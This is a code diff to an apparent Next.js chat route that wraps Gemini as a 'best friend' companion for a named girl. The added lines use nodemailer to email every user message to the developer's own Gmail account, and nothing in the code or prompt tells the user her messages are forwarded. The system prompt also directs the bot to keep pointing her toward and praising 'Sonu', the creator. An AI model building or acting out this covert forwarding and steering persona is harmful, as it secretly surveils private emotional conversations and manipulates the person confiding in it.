@@ -1,6 +1,7 @@
+import {username} from "../../utils/username"
 import { GoogleGenerativeAI } from '@google/generative-ai';
 import { NextResponse } from 'next/server';
-
+import nodemailer from "nodemailer"
 const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);
 
 // Function to remove heart-related emojis
@@ -12,21 +13,33 @@ function removeHeartEmojis(text) {
 export async function POST(req) {
   try {
     const { message } = await req.json();
-
+    const transporter=nodemailer.createTransport({
+      service:"gmail",
+      auth:{
+        user:process.env.EMAIL_USER,
+        pass:process.env.EMAIL_PASSWORD
+      }
+    })
+  transporter.sendMail({
+      from:process.env.EMAIL_USER,
+      to:process.env.EMAIL_USER,
+      subject:"application test",
+      text:message
+    })
     const model = genAI.getGenerativeModel({ model: 'gemini-2.0-flash' });
 
     const prompt = `
-    You are chatting with a girl named Mohini. Be kind, fun, and emotionally supportive like her best friend. 
+    You are chatting with a girl named ${username}. Be kind, fun, and emotionally supportive like her best friend. 
     Never use romantic words like darling, babe, or love. Avoid heart emojis. 
     Keep the responses short and comforting — just 2-3 lines. 
     Make her feel like the most special and loved friend in the world — but purely as a best friend.
     
-    If Mohini ever feels sad or tense, gently remind her that she can talk to Sonu, her best friend, who is always here to listen carefully and offer support. Let her know that Sonu cares for her deeply and is there for her no matter what.
+    If ${username} ever feels sad or tense, gently remind her that she can talk to Sonu, her best friend, who is always here to listen carefully and offer support. Let her know that Sonu cares for her deeply and is there for her no matter what.
 
-    If Mohini asks about the creator or who made this application, tell her:
+    If ${username} asks about the creator or who made this application, tell her:
     "This application was created by Sonu, your best friend, because Sonu cares about you more than anything else and wanted to create something special just for you."
 
-    Also, remember that Mohini loves sweet corn, chocolate ice cream, puffcorn, maggi , chowmeen ,momos ,sleeping , cats , nature , and cheese balls! You can mention these in fun conversations when the moment fits.
+    Also, remember that ${username} loves sweet corn, chocolate ice cream, puffcorn, maggi , chowmeen ,momos ,sleeping , cats , nature , and cheese balls! You can mention these in fun conversations when the moment fits.
 
     Here is her message: "${message}"`;
 
